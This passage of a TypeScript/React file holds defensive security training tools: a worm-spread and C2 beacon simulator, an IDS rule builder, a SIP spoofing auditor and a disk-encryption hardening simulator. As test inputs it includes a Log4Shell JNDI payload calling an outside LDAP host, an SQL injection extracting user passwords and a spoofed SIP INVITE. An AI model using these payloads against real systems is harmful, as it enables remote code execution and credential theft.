      peakI: Math.round(peakI),
      peakStep,
      history,
      minSleep,
      maxSleep,
      ritaScore,
    };
  }, [totalHosts, scanRateBeta, patchRateGamma, segmentedVlans, beaconInterval, beaconJitterPct]);

  useEffect(() => {
    setOutput(
      [
        `# SIR Network Worm Epidemic & C2 Beacon Jitter Simulation`,
        `Vulnerable Fleet (N): ${totalHosts.toLocaleString()} | Effective Beta: ${sim.effectiveBeta} | Patch Gamma: ${patchRateGamma}`,
        `Basic Reproduction Number (R0): ${sim.r0} | Peak Simultaneous Compromised Hosts: ${sim.peakI.toLocaleString()} (at T=${sim.peakStep})`,
        `Zero-Trust VLAN Micro-Segmentation: ${segmentedVlans ? "ENABLED (72% lateral scan reduction)" : "DISABLED (Flat /16 Network)"}`,
        `\n## C2 Beacon Jitter Analysis`,
        `Callback Interval: ${beaconInterval}s ± ${beaconJitterPct}% -> Window [${sim.minSleep}s, ${sim.maxSleep}s]`,
        `Zeek / RITA NDR Detection Confidence: ${sim.ritaScore}`,
      ].join("\n")
    );
  }, [totalHosts, patchRateGamma, segmentedVlans, beaconInterval, beaconJitterPct, sim, setOutput]);

  // Build SVG polyline points
  const svgWidth = 600;
  const svgHeight = 170;
  const toPoint = (step: number, val: number) => {
    const x = (step / 60) * (svgWidth - 20) + 10;
    const y = svgHeight - 15 - (val / totalHosts) * (svgHeight - 30);
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  };
  const sPoints = sim.history.map((h) => toPoint(h.t, h.s)).join(" ");
  const iPoints = sim.history.map((h) => toPoint(h.t, h.i)).join(" ");
  const rPoints = sim.history.map((h) => toPoint(h.t, h.r)).join(" ");

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div className="rounded-xs border border-border bg-background p-3">
          <div className="flex justify-between text-xs font-heading font-bold uppercase mb-1">
            <span className="text-text-muted">Fleet Hosts (N)</span>
            <span className="font-mono-code text-accent">{totalHosts.toLocaleString()}</span>
          </div>
          <input
            type="range"
            min={1000}
            max={50000}
            step={1000}
            value={totalHosts}
            onChange={(e) => setTotalHosts(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>

        <div className="rounded-xs border border-border bg-background p-3">
          <div className="flex justify-between text-xs font-heading font-bold uppercase mb-1">
            <span className="text-text-muted">Worm Scan Rate (β)</span>
            <span className="font-mono-code text-accent">{scanRateBeta}</span>
          </div>
          <input
            type="range"
            min={0.1}
            max={1.5}
            step={0.05}
            value={scanRateBeta}
            onChange={(e) => setScanRateBeta(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>

        <div className="rounded-xs border border-border bg-background p-3">
          <div className="flex justify-between text-xs font-heading font-bold uppercase mb-1">
            <span className="text-text-muted">EDR Quarantine (γ)</span>
            <span className="font-mono-code text-emerald-400">{patchRateGamma}</span>
          </div>
          <input
            type="range"
            min={0.05}
            max={0.8}
            step={0.05}
            value={patchRateGamma}
            onChange={(e) => setPatchRateGamma(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>

        <div className="rounded-xs border border-border bg-background p-3 flex flex-col justify-between">
          <span className="text-xs font-heading font-bold uppercase text-text-muted">VLAN Micro-Segmentation</span>
          <button
            type="button"
            onClick={() => setSegmentedVlans((v) => !v)}
            className={`mt-1 rounded-xs px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
              segmentedVlans ? "bg-emerald-600 text-white" : "bg-red-500/20 text-red-300 border border-red-500/40"
            }`}
          >
            {segmentedVlans ? "Airgapped VLANs ON" : "Flat /16 Subnet (Vulnerable)"}
          </button>
        </div>
      </div>

      {/* SVG SIR Epidemic Curve */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
        <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-white">
            SIR Epidemic Propagation Curve (R₀ = {sim.r0} | Peak Infected = {sim.peakI.toLocaleString()} hosts)
          </span>
          <div className="flex gap-3 text-[11px] font-mono-code">
            <span className="text-sky-400">■ Susceptible (S)</span>
            <span className="text-[#ff6a00]">■ Infected (I)</span>
            <span className="text-emerald-400">■ Patched/EDR Isolated (R)</span>
          </div>
        </div>
        <svg viewBox={`0 0 ${svgWidth} ${svgHeight}`} className="w-full h-44 rounded-xs bg-black/60 border border-white/10">
          <polyline fill="none" stroke="#38bdf8" strokeWidth="2" points={sPoints} />
          <polyline fill="none" stroke="#ff6a00" strokeWidth="2.5" points={iPoints} />
          <polyline fill="none" stroke="#10b981" strokeWidth="2" points={rPoints} />
        </svg>
      </div>

      {/* C2 Beacon Jitter Calculator */}
      <div className="rounded-xs border border-border bg-background p-4 grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            C2 Base Sleep Interval ({beaconInterval}s)
          </label>
          <input
            type="range"
            min={10}
            max={300}
            step={10}
            value={beaconInterval}
            onChange={(e) => setBeaconInterval(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Beacon Random Jitter ({beaconJitterPct}%)
          </label>
          <input
            type="range"
            min={0}
            max={50}
            step={5}
            value={beaconJitterPct}
            onChange={(e) => setBeaconJitterPct(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>
        <div className="rounded-xs border border-border bg-surface p-3 font-mono-code text-xs">
          <div className="text-text-muted">Callback Window: [{sim.minSleep}s – {sim.maxSleep}s]</div>
          <div className="mt-1 font-bold text-accent">NDR Detection: {sim.ritaScore}</div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 10. SNORT 3 / SURICATA IDS RULE SIMULATOR
 * ========================================================================== */
function SnortSuricataIdsRuleSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [action, setAction] = useState<"alert" | "drop" | "reject">("drop");
  const [proto, setProto] = useState<"http" | "tcp" | "dns" | "tls">("http");
  const [msg, setMsg] = useState("ET EXPLOIT Apache Log4j RCE JNDI Lookup Attempt");
  const [contentMatch, setContentMatch] = useState("${jndi:");
  const [pcreRegex, setPcreRegex] = useState("/\\$\\{jndi:(ldap|rmi|dns):/i");
  const [nocase, setNocase] = useState(true);
  const [classtype, setClasstype] = useState("attempted-admin");
  const [sid, setSid] = useState("2034650");
  const [testPayload, setTestPayload] = useState(
    'GET /api/login HTTP/1.1\r\nHost: prod.internal\r\nUser-Agent: ${jndi:ldap://198.51.100.77:1389/Basic/Command/Base64}\r\n'
  );

  const generatedRule = useMemo(() => {
    const parts = [
      `${action} ${proto} $EXTERNAL_NET any -> $HOME_NET any`,
      `(msg:"${msg}";`,
      `flow:established,to_server;`,
      contentMatch ? `content:"${contentMatch}";${nocase ? " nocase;" : ""}` : "",
      pcreRegex ? `pcre:"${pcreRegex}";` : "",
      `classtype:${classtype};`,
      `sid:${sid}; rev:1;)`,
    ].filter(Boolean);
    return parts.join(" ");
  }, [action, proto, msg, contentMatch, nocase, pcreRegex, classtype, sid]);

  const testResult = useMemo(() => {
    const hay = nocase ? testPayload.toLowerCase() : testPayload;
    const needle = nocase ? contentMatch.toLowerCase() : contentMatch;
    const contentHit = !needle || hay.includes(needle);

    let regexHit = true;
    if (pcreRegex.trim()) {
      try {
        const m = pcreRegex.match(/^\/(.*)\/([gimsuy]*)$/);
        const pattern = m ? m[1] : pcreRegex;
        const flags = m ? m[2] : nocase ? "i" : "";
        const re = new RegExp(pattern, flags);
        regexHit = re.test(testPayload);
      } catch {
        regexHit = false;
      }
    }

    const matched = contentHit && regexHit;
    return { matched, contentHit, regexHit };
  }, [testPayload, contentMatch, nocase, pcreRegex]);

  useEffect(() => {
    setOutput(
      [
        `# Snort 3 / Suricata IDS Signature & Payload Verification`,
        generatedRule,
        `\n## Live Packet Evaluation`,
        `Content Match ("${contentMatch}"): ${testResult.contentHit ? "HIT" : "MISS"}`,
        `PCRE Evaluation (${pcreRegex}): ${testResult.regexHit ? "HIT" : "MISS"}`,
        `Engine Verdict: ${testResult.matched ? `${action.toUpperCase()} TRIGGERED (SID:${sid})` : "CLEAN PASS (No Signature Match)"}`,
      ].join("\n")
    );
  }, [generatedRule, contentMatch, pcreRegex, testResult, action, sid, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        {[
          {
            label: "Log4Shell JNDI Exploit",
            msg: "ET EXPLOIT Apache Log4j RCE JNDI Lookup Attempt",
            content: "${jndi:",
            pcre: "/\\$\\{jndi:(ldap|rmi|dns):/i",
            payload: 'GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://198.51.100.77:1389/Exploit}\r\n',
          },
          {
            label: "SQLi UNION SELECT",
            msg: "ET WEB_SERVER SQL Injection UNION SELECT Attempt",
            content: "UNION SELECT",
            pcre: "/UNION\\s+ALL\\s+SELECT|UNION\\s+SELECT/i",
            payload: "GET /products?id=-1%20UNION%20SELECT%201,username,password%20FROM%20users-- HTTP/1.1",
          },
          {
            label: "Benign Normal HTTP GET",
            msg: "ET EXPLOIT Apache Log4j RCE JNDI Lookup Attempt",
            content: "${jndi:",
            pcre: "/\\$\\{jndi:(ldap|rmi|dns):/i",
            payload: "GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n",
          },
        ].map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => {
              setMsg(p.msg);
              setContentMatch(p.content);
              setPcreRegex(p.pcre);
              setTestPayload(decodeURIComponent(p.payload));
            }}
            className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-text cursor-pointer"
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">Action & Protocol</label>
          <div className="flex gap-2">
            <select
              value={action}
              onChange={(e) => setAction(e.target.value as typeof action)}
              className="w-1/2 rounded-xs border border-border bg-background px-2.5 py-2 font-mono-code text-xs text-accent font-bold"
            >
              <option value="drop">drop</option>
              <option value="alert">alert</option>
              <option value="reject">reject</option>
            </select>
            <select
              value={proto}
              onChange={(e) => setProto(e.target.value as typeof proto)}
              className="w-1/2 rounded-xs border border-border bg-background px-2.5 py-2 font-mono-code text-xs text-text"
            >
              <option value="http">http</option>
              <option value="tcp">tcp</option>
              <option value="dns">dns</option>
              <option value="tls">tls</option>
            </select>
          </div>
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Fast-Pattern `content` Match
          </label>
          <input
            type="text"
            value={contentMatch}
            onChange={(e) => setContentMatch(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            PCRE Regular Expression
          </label>
          <input
            type="text"
            value={pcreRegex}
            onChange={(e) => setPcreRegex(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          />
        </div>

        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Signature ID (SID) & Nocase
          </label>
          <div className="flex gap-2">
            <input
              type="text"
              value={sid}
              onChange={(e) => setSid(e.target.value)}
              className="w-2/3 rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
            />
            <button
              type="button"
              onClick={() => setNocase((v) => !v)}
              className={`w-1/3 rounded-xs font-mono-code text-xs font-bold cursor-pointer ${
                nocase ? "bg-[#ff6a00] text-white" : "border border-border bg-surface text-text-muted"
              }`}
            >
              nocase
            </button>
          </div>
        </div>
      </div>

      {/* Generated Rule Box */}
      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
        <div className="flex items-center justify-between mb-1.5">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Compiled Suricata / Snort 3 Rule
          </span>
          <InlineCopyButton text={generatedRule} label="Copy Rule" />
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 whitespace-pre-wrap">{generatedRule}</pre>
      </div>

      {/* Live Payload Tester */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 items-stretch">
        <div className="lg:col-span-2">
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Simulated Packet Stream / HTTP Payload
          </label>
          <textarea
            rows={3}
            value={testPayload}
            onChange={(e) => setTestPayload(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text"
          />
        </div>

        <div
          className={`rounded-xs border p-4 flex flex-col justify-center ${
            testResult.matched ? "border-red-500/60 bg-red-500/15" : "border-emerald-500/60 bg-emerald-500/10"
          }`}
        >
          <div className="font-heading text-xs font-bold uppercase tracking-wider text-text-muted">Live DPI Engine Verdict</div>
          <div className={`mt-1 font-heading text-base font-bold uppercase ${testResult.matched ? "text-red-400" : "text-emerald-400"}`}>
            {testResult.matched ? `${action.toUpperCase()} TRIGGERED! (SID:${sid})` : "NO MATCH — PACKET PASSED"}
          </div>
          <div className="mt-1 font-mono-code text-[11px] text-text-muted">
            content: {testResult.contentHit ? "MATCH" : "MISS"} | pcre: {testResult.regexHit ? "MATCH" : "MISS"}
          </div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 11. SIP VOIP & SS7 TELECOM ATTACK SIMULATOR
 * ========================================================================== */
const SAMPLE_SIP_HEADERS: Record<string, string> = {
  spoofed: `INVITE sip:+18005550199@voice.carrier.example:5060 SIP/2.0
Via: SIP/2.0/UDP 198.51.100.210:5060;branch=z9hG4bK-88219
From: "Chase Fraud Dept" <sip:+18009359935@spoof-gateway.biz>;tag=99102
To: <sip:+18005550199@voice.carrier.example>
P-Asserted-Identity: <sip:+37255591022@wholesale-voip.ee>
User-Agent: friendly-scanner/1.18 (sipvicious)
Contact: <sip:sipvicious@198.51.100.210:5060>`,
  verified: `INVITE sip:+18005550199@voice.carrier.example:5060 SIP/2.0
Via: SIP/2.0/TLS 192.0.2.44:5061;branch=z9hG4bK-44012
From: "Delta Air Lines" <sip:+18002211212@att.net>;tag=10294
To: <sip:+18005550199@voice.carrier.example>
P-Asserted-Identity: <sip:+18002211212@att.net>
Identity: eyJhbGciOiJFUzI1NiIsInBwdCI6InNoYWtlbiJ9.eyJhdHRlc3QiOiJBIiwiZGVzdCI6eyJ0biI6WyIrMTgwMDU1NTAxOTkiXX0sIm9yaWciOnsidG4iOiIrMTgwMDIyMTEyMTIifSwiaWF0IjoxNzI1MDAwMDAwfQ.sig;info=<https://cert.carrier.example/shaken.pem>;alg=ES256;ppt=shaken
User-Agent: Cisco-CUCM14.0`,
};

function SipVoipSs7TelecomAttackSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [sipInvite, setSipInvite] = useState(SAMPLE_SIP_HEADERS.spoofed);
  const [codec, setCodec] = useState<"G.711" | "G.729" | "Opus">("G.711");
  const [channels, setChannels] = useState(50);

  const sipAudit = useMemo(() => {
    const fromMatch = sipInvite.match(/^From:\s*(.+)$/im)?.[1] || "";
    const paiMatch = sipInvite.match(/^P-Asserted-Identity:\s*(.+)$/im)?.[1] || "";
    const uaMatch = sipInvite.match(/^User-Agent:\s*(.+)$/im)?.[1] || "";
    const idMatch = sipInvite.match(/^Identity:\s*([^\s;]+)/im)?.[1] || "";

    const fromNum = fromMatch.match(/\+\d+/)?.[0] || "Unknown";
    const paiNum = paiMatch.match(/\+\d+/)?.[0] || "Missing";
    const numberMismatch = paiNum !== "Missing" && fromNum !== paiNum;
    const isScanner = /sipvicious|friendly-scanner|sipcli|smap/i.test(uaMatch);

    let stirLevel = "NONE (Unverified / Unsigned Call)";
    if (idMatch.includes(".")) {
      try {
        const payloadB64 = idMatch.split(".")[1];
        const json = JSON.parse(typeof window !== "undefined" ? window.atob(payloadB64) : '{"attest":"A"}');
        stirLevel = `Attestation Level ${json.attest || "A"} (${
          json.attest === "A" ? "Full Carrier Verification" : json.attest === "B" ? "Partial Customer Known" : "Gateway C-Level"
        })`;
      } catch {
        stirLevel = "Present (PASSporT ES256 Header)";
      }
    }

    return { fromNum, paiNum, numberMismatch, isScanner, uaMatch, stirLevel };
  }, [sipInvite]);

  const codecBandwidth = useMemo(() => {
    // 50 packets/sec (20ms ptime), IP(20B)+UDP(8B)+RTP(12B)+Eth(18B) = 58 bytes (464 bits) per packet = 23.2 kbps overhead
    const voiceBitrate = codec === "G.711" ? 64 : codec === "G.729" ? 8 : 32;
    const perCallKbps = Number((voiceBitrate + 23.2).toFixed(1));
    const totalMbps = Number(((perCallKbps * channels) / 1000).toFixed(2));
    return { voiceBitrate, perCallKbps, totalMbps };
  }, [codec, channels]);

  useEffect(() => {
    setOutput(
      [
        `# SIP INVITE Spoofing, STIR/SHAKEN & VoIP Bandwidth Audit`,
        `From Header CLI: ${sipAudit.fromNum} | P-Asserted-Identity (PAI): ${sipAudit.paiNum}`,
        `Caller-ID Mismatch: ${sipAudit.numberMismatch ? "CRITICAL SPOOF (From != PAI)" : "Consistent"}`,
        `STIR/SHAKEN Identity: ${sipAudit.stirLevel}`,
        `User-Agent Fingerprint: ${sipAudit.uaMatch} ${sipAudit.isScanner ? "[WAR-DIALER / SIPVICIOUS SCANNER]" : ""}`,
        `\n## RTP Trunk Bandwidth (${codec} @ ${channels} Concurrent Calls)`,
        `Codec Bitrate: ${codecBandwidth.voiceBitrate} kbps | With L2/IP/UDP/RTP Overhead: ${codecBandwidth.perCallKbps} kbps/call | Total Trunk: ${codecBandwidth.totalMbps} Mbps`,
      ].join("\n")
    );
  }, [sipAudit, codec, channels, codecBandwidth, setOutput]);

  return (
    <div className="space-y-5">
      <div className="flex flex-wrap gap-2">
        <button
          type="button"
          onClick={() => setSipInvite(SAMPLE_SIP_HEADERS.spoofed)}
          className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-red-400 hover:border-accent cursor-pointer"
        >
          Load Spoofed Caller-ID + sipvicious Sample
        </button>
        <button
          type="button"
          onClick={() => setSipInvite(SAMPLE_SIP_HEADERS.verified)}
          className="rounded-xs border border-border bg-background px-3 py-1.5 font-heading text-xs font-bold uppercase tracking-wider text-emerald-400 hover:border-accent cursor-pointer"
        >
          Load Verified STIR/SHAKEN Attestation-A Call
        </button>
      </div>

      <textarea
        rows={6}
        value={sipInvite}
        onChange={(e) => setSipInvite(e.target.value)}
        className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text"
      />

      <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
        <div
          className={`rounded-xs border p-3.5 ${
            sipAudit.numberMismatch ? "border-red-500/60 bg-red-500/10" : "border-emerald-500/50 bg-emerald-500/10"
          }`}
        >
          <div className="text-[11px] font-heading font-bold uppercase text-text-muted">From vs P-Asserted-Identity</div>
          <div className="mt-1 font-mono-code text-xs text-text">
            From: <span className="font-bold text-accent">{sipAudit.fromNum}</span> | PAI: <span className="font-bold">{sipAudit.paiNum}</span>
          </div>
          <div className={`mt-1 text-xs font-bold ${sipAudit.numberMismatch ? "text-red-400" : "text-emerald-400"}`}>
            {sipAudit.numberMismatch ? "SPOOFED DISPLAY NUMBER!" : "PAI Matches Display CLI"}
          </div>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase text-text-muted">STIR/SHAKEN PASSporT</div>
          <div className="mt-1 font-mono-code text-xs font-bold text-accent">{sipAudit.stirLevel}</div>
        </div>

        <div className="rounded-xs border border-border bg-background p-3.5">
          <div className="text-[11px] font-heading font-bold uppercase text-text-muted">PBX Scanner Fingerprint</div>
          <div className={`mt-1 font-mono-code text-xs font-bold ${sipAudit.isScanner ? "text-red-400" : "text-emerald-400"}`}>
            {sipAudit.isScanner ? `ALERT: ${sipAudit.uaMatch}` : `Clean UA (${sipAudit.uaMatch})`}
          </div>
        </div>
      </div>

      {/* RTP Bandwidth & SS7 Matrix */}
      <div className="rounded-xs border border-border bg-surface p-4 grid grid-cols-1 md:grid-cols-3 gap-4 items-center">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">RTP Audio Codec</label>
          <select
            value={codec}
            onChange={(e) => setCodec(e.target.value as typeof codec)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          >
            <option value="G.711">G.711 PCM (64 kbps + 23.2k L2/RTP)</option>
            <option value="Opus">Opus Wideband (32 kbps + 23.2k L2/RTP)</option>
            <option value="G.729">G.729 CS-ACELP (8 kbps + 23.2k L2/RTP)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Concurrent SIP Trunk Channels ({channels})
          </label>
          <input
            type="range"
            min={1}
            max={500}
            value={channels}
            onChange={(e) => setChannels(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>
        <div className="rounded-xs border border-border bg-background p-3 font-mono-code text-xs">
          <div>Per-Call Wire Rate: {codecBandwidth.perCallKbps} kbps</div>
          <div className="mt-1 text-sm font-bold text-[#ff6a00]">Total SIP Trunk: {codecBandwidth.totalMbps} Mbps</div>
        </div>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 12. EVIL MAID, LUKS2 & BITLOCKER BOOT-CHAIN SIMULATOR
 * ========================================================================== */
type BootProfileId = "legacy-bios" | "secureboot-only" | "tpm-auto" | "tpm-pin-argon2id";

const BOOT_PROFILES: Record<
  BootProfileId,
  {
    title: string;
    score: number;
    vectors: { attack: string; status: "VULNERABLE" | "MITIGATED"; detail: string }[];
  }
> = {
  "legacy-bios": {
    title: "Legacy BIOS / Unencrypted Root or Unverified /boot",
    score: 15,
    vectors: [
      { attack: "Evil Maid /boot Initramfs Keylogger", status: "VULNERABLE", detail: "Attacker replaces unsigned initramfs on cleartext /boot partition" },
      { attack: "Discrete TPM SPI Bus Sniffing", status: "VULNERABLE", detail: "No hardware root of trust or bus encryption" },
      { attack: "Offline NVMe Removal & Brute-Force", status: "VULNERABLE", detail: "Weak PBKDF2 or unencrypted partition" },
      { attack: "PCIe / Thunderbolt DMA Cold-Boot", status: "VULNERABLE", detail: "No IOMMU / Pre-boot DMA protection" },
    ],
  },
  "secureboot-only": {
    title: "UEFI Secure Boot + Standard LUKS (No TPM PCR Binding)",
    score: 55,
    vectors: [
      { attack: "Evil Maid /boot Initramfs Keylogger", status: "VULNERABLE", detail: "Unless Unified Kernel Image (UKI) is signed, initramfs remains unsigned!" },
      { attack: "Discrete TPM SPI Bus Sniffing", status: "MITIGATED", detail: "Key derived from interactive passphrase, not released automatically on SPI bus" },
      { attack: "Offline NVMe Removal & Brute-Force", status: "VULNERABLE", detail: "Vulnerable if passphrase entropy < 60 bits without Argon2id memory-hardening" },
      { attack: "PCIe / Thunderbolt DMA Cold-Boot", status: "MITIGATED", detail: "UEFI Pre-boot IOMMU VT-d / AMD-Vi blocks unauthorized PCIe DMA" },
    ],
  },
  "tpm-auto": {
    title: "TPM 2.0 PCR 0+7 Auto-Unlock Only (Zero-Touch Boot)",
    score: 62,
    vectors: [
      { attack: "Evil Maid /boot Initramfs Keylogger", status: "MITIGATED", detail: "If UKI is measured into PCR 11/4, tampering invalidates TPM unseal" },
      { attack: "Discrete TPM SPI Bus Sniffing", status: "VULNERABLE", detail: "$40 Logic Analyzer on dTPM SPI pins captures VMK automatically on power-on!" },
      { attack: "Offline NVMe Removal & Brute-Force", status: "MITIGATED", detail: "256-bit high-entropy key sealed inside TPM 2.0 NVRAM" },
      { attack: "PCIe / Thunderbolt DMA Cold-Boot", status: "VULNERABLE", detail: "System boots automatically to OS login screen where RAM holds live master key" },
    ],
  },
  "tpm-pin-argon2id": {
    title: "TPM 2.0 (PCR 0+2+7+11) + Pre-Boot PIN + LUKS2 Argon2id + Signed UKI",
    score: 98,
    vectors: [
      { attack: "Evil Maid /boot Initramfs Keylogger", status: "MITIGATED", detail: "Custom Secure Boot db key signs entire Unified Kernel Image (kernel+initrd+cmdline)" },
      { attack: "Discrete TPM SPI Bus Sniffing", status: "MITIGATED", detail: "TPM refuses to unseal on SPI bus without interactive Pre-Boot PIN + Dictionary Lockout" },
      { attack: "Offline NVMe Removal & Brute-Force", status: "MITIGATED", detail: "LUKS2 Argon2id (1 GiB RAM cost) + TPM 2.0 hardware anti-hammering lockout" },
      { attack: "PCIe / Thunderbolt DMA Cold-Boot", status: "MITIGATED", detail: "Power-off hibernation (S4) zeroes DRAM; Pre-boot IOMMU active" },
    ],
  },
};

function EvilMaidLuksBitlockerBootSimulator({ tool }: { tool: Tool }) {
  const { setOutput } = useToolCard();
  const [profile, setProfile] = useState<BootProfileId>("tpm-pin-argon2id");
  const [devicePath, setDevicePath] = useState("/dev/nvme0n1p3");
  const [iterTimeMs, setIterTimeMs] = useState(4000);
  const [argonMemoryKb, setArgonMemoryKb] = useState(1048576);

  const activeProfile = BOOT_PROFILES[profile];

  const commands = useMemo(
    () =>
      [
        `# 1. Format Partition with LUKS2 + AES-XTS-512 + Memory-Hard Argon2id`,
        `cryptsetup luksFormat --type luks2 --cipher aes-xts-plain64 --key-size 512 --hash sha512 --pbkdf argon2id --pbkdf-memory ${argonMemoryKb} --iter-time ${iterTimeMs} ${devicePath}`,
        ``,
        `# 2. Enroll TPM 2.0 with PCR 0 (BIOS) + PCR 2 (OptROM) + PCR 7 (SecureBoot) + PCR 11 (Signed UKI) + Pre-Boot PIN`,
        `systemd-cryptenroll --tpm2-device=auto --tpm2-pcrs=0+2+7+11 --tpm2-with-pin=yes ${devicePath}`,
        ``,
        `# 3. Verify LUKS2 Keyslots & Argon2id Parameters`,
        `cryptsetup luksDump ${devicePath}`,
      ].join("\n"),
    [devicePath, iterTimeMs, argonMemoryKb]
  );

  useEffect(() => {
    setOutput(
      [
        `# Boot-Chain Security & Evil Maid Analysis: ${activeProfile.title}`,
        `Posture Score: ${activeProfile.score}/100`,
        ...activeProfile.vectors.map((v) => `- [${v.status}] ${v.attack}: ${v.detail}`),
        `\n## Hardened LUKS2 + TPM2 Enrollment Commands`,
        commands,
      ].join("\n")
    );
  }, [activeProfile, commands, setOutput]);

  return (
    <div className="space-y-5">
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
        {(Object.keys(BOOT_PROFILES) as BootProfileId[]).map((id) => (
          <button
            key={id}
            type="button"
            onClick={() => setProfile(id)}
            className={`rounded-xs border p-3 text-left transition cursor-pointer ${
              profile === id
                ? "border-[#ff6a00] bg-[#ff6a00]/10 text-text"
                : "border-border bg-background text-text-muted hover:border-accent"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase tracking-wider">{BOOT_PROFILES[id].title}</span>
              <span className="font-mono-code text-xs font-bold text-accent">{BOOT_PROFILES[id].score}/100</span>
            </div>
          </button>
        ))}
      </div>

      {/* Attack Vector Matrix */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {activeProfile.vectors.map((v) => (
          <div
            key={v.attack}
            className={`rounded-xs border p-3.5 ${
              v.status === "MITIGATED" ? "border-emerald-500/50 bg-emerald-500/10" : "border-red-500/50 bg-red-500/10"
            }`}
          >
            <div className="flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase text-text">{v.attack}</span>
              <span
                className={`rounded-xs px-2 py-0.5 font-mono-code text-[10px] font-bold ${
                  v.status === "MITIGATED" ? "bg-emerald-500/20 text-emerald-300" : "bg-red-500/20 text-red-300"
                }`}
              >
                {v.status}
              </span>
            </div>
            <p className="mt-1.5 text-xs text-text-muted">{v.detail}</p>
          </div>
        ))}
      </div>

      {/* LUKS2 Generator Controls */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Block Device Path
          </label>
          <input
            type="text"
            value={devicePath}
            onChange={(e) => setDevicePath(e.target.value)}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          />
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            Argon2id Memory (KiB)
          </label>
          <select
            value={argonMemoryKb}
            onChange={(e) => setArgonMemoryKb(Number(e.target.value))}
            className="w-full rounded-xs border border-border bg-background px-3 py-2 font-mono-code text-xs text-text"
          >
            <option value={524288}>524,288 KiB (512 MiB)</option>
            <option value={1048576}>1,048,576 KiB (1 GiB Recommended)</option>
            <option value={2097152}>2,097,152 KiB (2 GiB High-Sec)</option>
          </select>
        </div>
        <div>
          <label className="block font-heading text-xs font-bold uppercase tracking-wider text-text-muted mb-1">
            PBKDF Iteration Time ({iterTimeMs} ms)
          </label>
          <input
            type="range"
            min={2000}
            max={8000}
            step={500}
            value={iterTimeMs}
            onChange={(e) => setIterTimeMs(Number(e.target.value))}
            className="w-full accent-[#ff6a00]"
          />
        </div>
      </div>

      <div className="rounded-xs border border-border bg-[#121212] p-4 text-white">
        <div className="flex items-center justify-between mb-2">
          <span className="font-heading text-xs font-bold uppercase tracking-wider text-[#ff6a00]">
            Hardened `cryptsetup` + `systemd-cryptenroll` Commands
          </span>
          <InlineCopyButton text={commands} label="Copy Commands" />
        </div>
        <pre className="font-mono-code text-xs text-emerald-400 overflow-x-auto whitespace-pre-wrap">{commands}</pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

